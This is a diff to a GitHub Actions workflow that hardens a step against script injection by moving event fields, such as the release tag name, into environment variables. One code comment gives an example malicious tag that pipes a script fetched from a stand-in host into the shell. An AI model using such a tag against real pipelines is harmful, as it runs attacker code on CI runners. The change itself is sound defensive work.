@@ -66,18 +66,28 @@ jobs:
         id: target
         # workflow_run fires for pushes as well as pull requests, and carries
         # its own head_sha rather than the checked-out one.
+        env:
+          # A tag name is the field here that is genuinely dangerous. Git
+          # allows `;`, `$` and `&` in a ref, so `v1.0;curl evil.sh|sh` is a
+          # legal tag - and interpolated into this script it would run on the
+          # runner. Bound to env it is only ever a string.
+          EVENT_NAME: ${{ github.event_name }}
+          PUSH_SHA: ${{ github.sha }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          RUN_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
+          RUN_PR: ${{ github.event.workflow_run.pull_requests[0].number || 0 }}
         run: |
           set -euo pipefail
-          if [ "${{ github.event_name }}" = "release" ]; then
+          if [ "$EVENT_NAME" = "release" ]; then
             {
               echo "kind=release_gate"
-              echo "sha=${{ github.sha }}"
-              echo "tag=${{ github.event.release.tag_name }}"
+              echo "sha=$PUSH_SHA"
+              echo "tag=$RELEASE_TAG"
               echo "pr=0"
             } >> "$GITHUB_OUTPUT"
           else
-            SHA="${{ github.event.workflow_run.head_sha || github.sha }}"
-            PR="${{ github.event.workflow_run.pull_requests[0].number || 0 }}"
+            SHA="$RUN_SHA"
+            PR="$RUN_PR"
             if [ "$PR" != "0" ]; then
               KIND=pr_gate
             else
